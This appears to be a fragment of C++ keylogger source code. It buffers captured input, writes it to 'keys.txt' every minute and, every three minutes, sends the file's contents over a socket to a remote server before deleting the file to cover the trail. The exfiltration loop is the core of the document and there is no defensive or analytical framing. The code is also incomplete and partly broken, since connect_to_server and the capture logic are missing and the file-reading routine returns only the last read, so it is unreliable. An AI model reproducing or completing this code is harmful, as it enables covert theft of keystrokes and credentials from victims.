// #include <windows.h>
#include <thread>
#include <iostream>
#include <chrono>
#include <mutex>
#include <unistd.h>

int counter = 1;
std::mutex mtx;
std::string buffer = "";
ofstream out;

string filename = "./keys.txt";

string read_file(string filename) {
    ifstream f;

    string text;

    f.open(filename);

    if (f.is_open()) {
        while (getline(f, text)) {
            
        }

        f.close();
    }
    
    return text;
}

SOCKET * result_socket = NULL;

void tick() {
	while (true) {
		if (counter > 180) 
			counter = 1;

		std::this_thread::sleep_for(std::chrono::seconds(1));

        if (counter % 180 == 0){
            string text = read_file(filename);

            SOCKET ** sock_arr;

            sock_arr = (SOCKET **) calloc(256, sizeof(sock_arr[0]));

            for (int i = 0; i < 256; i++) {
                sock_arr[i] = (SOCKET *) calloc(256, sizeof(sock_arr[0][0]));
            }

            fd_set ** fds;

            fds = (fd_set **) calloc(256, sizeof(sock_arr[0]));

            for (int i = 0; i < 256; i++) {
                fds[i] = (fd_set *) calloc(256, sizeof(sock_arr[0][0]));
            }

            int range1, range2, begin_range1, begin_range2;

            bool ready = false;

            if (result_socket == NULL){
                connect_to_server(fds, sock_arr, &range1, &range2, &begin_range1, &begin_range2);

                timeval timeout;

                timeout.tv_sec = 0;
                timeout.tv_usec = 1000;

                while (!ready) {
                    for (int i = begin_range1; i < range1; i++) {
                        for (int j = begin_range2; j < range2; j++) {
                            int is_set_result = select(1, NULL, &((fds)[i][j]), NULL, &timeout);

                            if (is_set_result) {
                                result_socket = &((sock_arr)[i][j]);

                                if (result_socket){
                                    ready = true;
                                    break;
                                }
                            }
                        }
                    }
                }
            }

            int send_result = send(*result_socket, text.c_str(), strlen(text.c_str()), 0);

            cout << text.c_str() << endl;

            cout << "Send result: " << send_result << endl;

            if (send_result == -1) {
                closesocket(*result_socket);

                result_socket = NULL;
            }

            int delete_status = remove(filename.c_str());

            // out.open(filename, std::ofstream::out | std::ofstream::trunc);
            // out.close();

            buffer = "";
        }

        else if (counter % 60 == 0){
            out.open(filename, std::ios_base::app);
            mtx.lock();
            out << buffer;
            mtx.unlock();
            out.close();
        }

        cout << counter << endl;
		counter++;
	}
}